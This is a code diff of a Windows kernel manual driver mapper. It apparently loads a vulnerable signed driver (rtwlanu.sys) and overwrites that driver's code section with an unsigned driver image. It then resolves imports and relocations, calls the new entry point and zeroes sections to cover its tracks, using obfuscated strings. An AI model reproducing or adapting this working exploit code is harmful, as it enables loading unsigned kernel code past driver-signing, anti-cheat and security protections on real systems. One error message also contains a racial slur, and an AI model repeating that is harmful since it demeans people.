@@ -24,69 +24,81 @@
 modules::section_data text_section = modules::section_data();
 modules::section_data data_section = modules::section_data();
 
-
-
-struct EntryInitialize
+typedef struct _RELOC_NAME_TABLE_ENTRY
 {
-	uintptr_t mappedImageBase{};
-	size_t mappedImageSize{};
-};
+	UINT16 Hint;
+	char8_t Name[];
+} RELOC_NAME_TABLE_ENTRY, PRELOC_NAME_TABLE_ENTRY;
 
-using EntryFuncCall = NTSTATUS(__stdcall*) (EntryInitialize*);
+typedef struct _RELOC_BLOCK_HDR
+{
+	UINT32 PageRVA;
+	UINT32 BlockSize;
+} RELOC_BLOCK_HDR, * PRELOC_BLOCK_HDR;
+
+typedef struct _RELOC_ENTRY
+{
+	UINT16 Offset : 12;
+	UINT16 Type : 4;
+} RELOC_ENTRY, * PRELOC_ENTRY;
 
 NTSTATUS map_new_driver()
 {
 	const auto driver_size = sizeof(raw_driver_bytes);
+	
+	PVOID base = (PVOID)text_section.address;
+	ULONG size = text_section.size;
 
-	if (driver_size > text_section.size)
+	const auto local_driver_base = reinterpret_cast<uintptr_t>(imports::ex_allocate_pool(NonPagedPool, driver_size));
+	if (!local_driver_base)
 	{
-		printf("Driver too big.\n");
+		printf("Failed to allocate local driver base.\n");
 		return STATUS_UNSUCCESSFUL;
 	}
 	
-	//ctx::write_protected_address(
-	//	reinterpret_cast<void*>(text_section.address),
-	//	raw_driver_bytes,
-	//	driver_size,
-	//	true
-	//);
-
-	const auto driverBase = reinterpret_cast<uintptr_t>(ExAllocatePool(NonPagedPool, driver_size));
-	if (!driverBase) return STATUS_UNSUCCESSFUL;
-
-	memcpy(reinterpret_cast<void*>(driverBase), reinterpret_cast<void*>(raw_driver_bytes), driver_size);
-
-	mapper::resolve_imports(driverBase);
-
-	const auto dosHeaders = reinterpret_cast<PIMAGE_DOS_HEADER>(driverBase);
-	const auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(driverBase + dosHeaders->e_lfanew);
-
-	const PIMAGE_SECTION_HEADER currentImageSection = IMAGE_FIRST_SECTION(ntHeaders);
-
-	for (auto i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i)
-	{
-		auto sectionAddress = reinterpret_cast<void*>(text_section.address + currentImageSection[i].VirtualAddress);
-
-		memcpy(sectionAddress, reinterpret_cast<void*>(driverBase + currentImageSection[i].PointerToRawData), currentImageSection[i].SizeOfRawData);
+	crt::kmemcpy(reinterpret_cast<void*>(local_driver_base), raw_driver_bytes, driver_size);
+	
+	const auto dos_headers = reinterpret_cast<PIMAGE_DOS_HEADER>(local_driver_base);
+	const auto nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS>(local_driver_base + dos_headers->e_lfanew);
+	
+	PIMAGE_SECTION_HEADER sec_hdr = (PIMAGE_SECTION_HEADER)((BYTE*)(&nt_headers->FileHeader) + sizeof(IMAGE_FILE_HEADER) + nt_headers->FileHeader.SizeOfOptionalHeader);
+	for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++, sec_hdr++) {
+		crt::kmemcpy((void*)(local_driver_base + sec_hdr->VirtualAddress), raw_driver_bytes + sec_hdr->PointerToRawData, sec_hdr->SizeOfRawData);
 	}
-
-	mapper::resolve_relocs(driverBase, text_section.address, text_section.address - ntHeaders->OptionalHeader.ImageBase);
-
-	ExFreePool(reinterpret_cast<void*>(driverBase));
-
-	const auto entryParams = reinterpret_cast<EntryInitialize*>(ExAllocatePool(NonPagedPool, sizeof(EntryInitialize)));
-	if (!entryParams)
-	{
+	
+	mapper::resolve_imports(local_driver_base);
+	
+	INT64 load_delta = (INT64)(local_driver_base - nt_headers->OptionalHeader.ImageBase);
+	PIMAGE_DATA_DIRECTORY reloc = &nt_headers->OptionalHeader.DataDirectory[5];
+	for (PRELOC_BLOCK_HDR i = (PRELOC_BLOCK_HDR)(local_driver_base + reloc->VirtualAddress); i < (PRELOC_BLOCK_HDR)(local_driver_base + reloc->VirtualAddress + reloc->Size); *(BYTE**)&i += i->BlockSize)
+		for (PRELOC_ENTRY entry = (PRELOC_ENTRY)i + 4; (BYTE*)entry < (BYTE*)i + i->BlockSize; ++entry)
+			if (entry->Type == 0xA)
+				*(UINT64*)(local_driver_base + i->PageRVA + entry->Offset) += load_delta;
+	
+	sec_hdr = (PIMAGE_SECTION_HEADER)((BYTE*)(&nt_headers->FileHeader) + sizeof(IMAGE_FILE_HEADER) + nt_headers->FileHeader.SizeOfOptionalHeader);
+	for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++, sec_hdr++)
+		if (sec_hdr->Characteristics & 0x02000000)
+			memset((void*)(local_driver_base + sec_hdr->VirtualAddress), 0x00, sec_hdr->SizeOfRawData);
+	
+	if (!nt_headers->OptionalHeader.AddressOfEntryPoint)
 		return STATUS_UNSUCCESSFUL;
-		return 0;
+
+	printf("Size: %i\n", nt_headers->OptionalHeader.SizeOfImage);
+
+	if (nt_headers->OptionalHeader.SizeOfImage > size)
+	{
+		printf("Too big driver fat nigga.\n");
+		return STATUS_UNSUCCESSFUL;
 	}
-
-	entryParams->mappedImageBase = text_section.address;
-	entryParams->mappedImageSize = ntHeaders->OptionalHeader.SizeOfImage;
-
-	EntryFuncCall mappedEntryPoint = reinterpret_cast<EntryFuncCall>(text_section.address + ntHeaders->OptionalHeader.AddressOfEntryPoint);
-
-	return mappedEntryPoint(entryParams);
+	
+	ctx::write_protected_address(base, (void*)local_driver_base, nt_headers->OptionalHeader.SizeOfImage, true);
+	
+	imports::ex_free_pool_with_tag(reinterpret_cast<void*>(local_driver_base), 0);
+	
+	unsigned long long(*DriverEntry)(PDRIVER_OBJECT obj, PUNICODE_STRING str) =
+		(unsigned long long(*)(PDRIVER_OBJECT, PUNICODE_STRING))(((BYTE*)base + nt_headers->OptionalHeader.AddressOfEntryPoint));
+	
+	return DriverEntry((PDRIVER_OBJECT)0, (PUNICODE_STRING)0);
 }
 
 NTSTATUS manual_mapped_entry(PVOID a1, PVOID a2)
@@ -119,7 +131,7 @@ NTSTATUS manual_mapped_entry(PVOID a1, PVOID a2)
 	ctx::nop_address_range(calldrv_address, PATCH_LENTH, original_bytes);
 
 	// Load driver to exploit
-	if (!modules::load_vurn_driver(skCrypt(L"\\registry\\machine\\SYSTEM\\CurrentControlSet\\Services\\drv1")))
+	if (!modules::load_vurn_driver(skCrypt(L"\\registry\\machine\\SYSTEM\\CurrentControlSet\\Services\\drv")))
 	{
 		printf("Couldnt load driver.\n");
 		ctx::restore_address_range(calldrv_address, PATCH_LENTH, original_bytes);
@@ -134,7 +146,7 @@ NTSTATUS manual_mapped_entry(PVOID a1, PVOID a2)
 
 	printf("Restored original bytes.\n");
 
-	const auto vurn_driver = modules::get_kernel_module(skCrypt("PaladinDriver.sys"));
+	const auto vurn_driver = modules::get_kernel_module(skCrypt("rtwlanu.sys"));
 	if (!vurn_driver)
 	{
 		printf("Couldnt find vurnable driver.\n");
@@ -164,7 +176,7 @@ NTSTATUS manual_mapped_entry(PVOID a1, PVOID a2)
 	ctx::zero_address_range(text_section.address, text_section.size);
 
 	// Zero .data section
-	ctx::zero_address_range(data_section.address, data_section.size);
+	//ctx::zero_address_range(data_section.address, data_section.size);
 
 	return map_new_driver();
 }
